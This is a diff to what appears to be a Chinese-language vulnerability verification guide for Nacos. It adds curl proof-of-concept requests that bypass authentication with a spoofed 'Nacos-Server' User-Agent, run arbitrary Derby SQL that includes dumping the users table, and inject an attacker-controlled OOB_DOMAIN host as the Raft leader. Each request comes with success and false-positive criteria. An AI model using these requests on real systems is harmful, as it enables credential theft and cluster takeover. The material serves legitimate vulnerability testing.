@@ -75,18 +75,24 @@ curl -X POST "http://target:8848/nacos/v1/core/cluster/report" \
 ## 验证方法
 
 ```bash
-# 检测7848 Raft端口是否开放
-curl -s --connect-timeout 3 http://target:7848/ || echo "端口开放（连接拒绝但可达）"
+# 1) Derby 未授权 SQL：让接口把本次标记算出来回显，不回显就说明没被当成 Server 身份执行
+curl -s "http://target:8848/nacos/v1/cs/ops/derby?sql=select+'POC_TOKEN'+from+sysibm.sysdummy1" \
+  -H "User-Agent: Nacos-Server"
+# 判据：响应体里出现 POC_TOKEN（本次请求才引入的串）
+# 反例：403 或 {"message":...} 这类鉴权失败报文、空响应，都不算——接口收下请求不等于能执行 SQL
 
-# 验证Derby SQL接口可未授权访问
-curl -s "http://target:8848/nacos/v1/cs/ops/derby?sql=select+1+from+sysibm.sysdummy1" \
-  -H "User-Agent: Nacos-Server" | grep -v "403\|error"
+# 2) 同一接口直接读 users 表，看是否返回真实行
+curl -s "http://target:8848/nacos/v1/cs/ops/derby?sql=select+*+from+users" \
+  -H "User-Agent: Nacos-Server"
+# 判据：响应是 users 表的数据行，字段带 username / password / enabled
+# 反例：只返回 {"message":"user not found!"} 之类的错误 JSON，不算
 
-# 验证cluster/report接口
-curl -s -o /dev/null -w "%{http_code}" -X POST \
-  "http://target:8848/nacos/v1/core/cluster/report" \
+# 3) Raft 注入：让目标把攻击者当集群节点，用带外确认注入生效
+curl -s -X POST "http://target:8848/nacos/v1/core/cluster/report" \
   -H "Content-Type: application/json" \
-  -d '{"ip":"127.0.0.1","port":7848,"state":"FOLLOWER"}'
+  -d '{"ip":"OOB_DOMAIN","port":7848,"state":"LEADER"}'
+# 判据：在 OOB_DOMAIN:7848 上收到目标发起的 Raft 连接（Jraft 握手字节，不是 HTTP 探测）
+# 反例：7848 端口能连上、或该 POST 返回 200 空白响应，都不算——只证明端口在，不证明节点被注入
 ```
 
 ## 指纹确认
